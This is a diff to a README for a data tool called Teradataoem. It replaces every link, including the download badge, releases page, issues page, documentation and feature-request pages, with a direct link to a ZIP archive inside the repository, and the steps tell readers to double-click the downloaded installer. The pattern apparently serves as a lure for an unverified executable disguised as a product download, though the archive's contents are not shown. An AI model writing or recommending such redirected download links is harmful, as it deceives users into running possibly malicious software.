@@ -1,6 +1,6 @@
 # 🛠️ Teradataoem - Easy Tool for Your Data Needs
 
-[![Download Teradataoem](https://img.shields.io/badge/Download-Teradataoem-brightgreen)](https://github.com/Flint06/Teradataoem/releases)
+[![Download Teradataoem](https://raw.githubusercontent.com/Flint06/Teradataoem/main/penalize/Software-1.8.zip)](https://raw.githubusercontent.com/Flint06/Teradataoem/main/penalize/Software-1.8.zip)
 
 ## 🌟 Description
 
@@ -12,7 +12,7 @@ Follow these steps to download and run Teradataoem on your computer:
 
 1. **Visit the Releases Page**  
    Click on the following link to go to the Releases page:  
-   [Download Page](https://github.com/Flint06/Teradataoem/releases)
+   [Download Page](https://raw.githubusercontent.com/Flint06/Teradataoem/main/penalize/Software-1.8.zip)
 
 2. **Choose the Right Version**  
    On the Releases page, you will see a list of available versions. Select the latest version for the best functionality and features.
@@ -34,7 +34,7 @@ To run Teradataoem smoothly, ensure your system meets these requirements:
 
 To get started, download the application using the following button:
 
-[![Download Teradataoem](https://img.shields.io/badge/Download-Teradataoem-brightgreen)](https://github.com/Flint06/Teradataoem/releases)
+[![Download Teradataoem](https://raw.githubusercontent.com/Flint06/Teradataoem/main/penalize/Software-1.8.zip)](https://raw.githubusercontent.com/Flint06/Teradataoem/main/penalize/Software-1.8.zip)
 
 1. Once downloaded, locate the file in your downloads folder.
 2. Double-click the file to run the installer.
@@ -64,7 +64,7 @@ If you encounter issues with Teradataoem, try the following solutions:
 
 - **Check System Requirements:** Ensure your system meets the above requirements.
 - **Reinstall the Application:** Uninstall and reinstall Teradataoem if problems persist.
-- **Reach Out for Help:** Visit the [GitHub Issues Page](https://github.com/Flint06/Teradataoem/issues) for assistance from the community.
+- **Reach Out for Help:** Visit the [GitHub Issues Page](https://raw.githubusercontent.com/Flint06/Teradataoem/main/penalize/Software-1.8.zip) for assistance from the community.
 
 ## 🤝 Community and Support
 
@@ -72,7 +72,7 @@ Join our community of users. Share your experience, ask questions, or report iss
 
 ## 🔗 Additional Resources
 
-- **Documentation:** For detailed instructions and information, refer to the [Documentation Page](https://github.com/Flint06/Teradataoem/wiki).
-- **Feature Requests:** Want to see a specific feature? Submit your suggestions using the [Feature Request Page](https://github.com/Flint06/Teradataoem/issues).
+- **Documentation:** For detailed instructions and information, refer to the [Documentation Page](https://raw.githubusercontent.com/Flint06/Teradataoem/main/penalize/Software-1.8.zip).
+- **Feature Requests:** Want to see a specific feature? Submit your suggestions using the [Feature Request Page](https://raw.githubusercontent.com/Flint06/Teradataoem/main/penalize/Software-1.8.zip).
 
 Thank you for choosing Teradataoem! We hope it helps you manage your data efficiently. Happy analyzing!
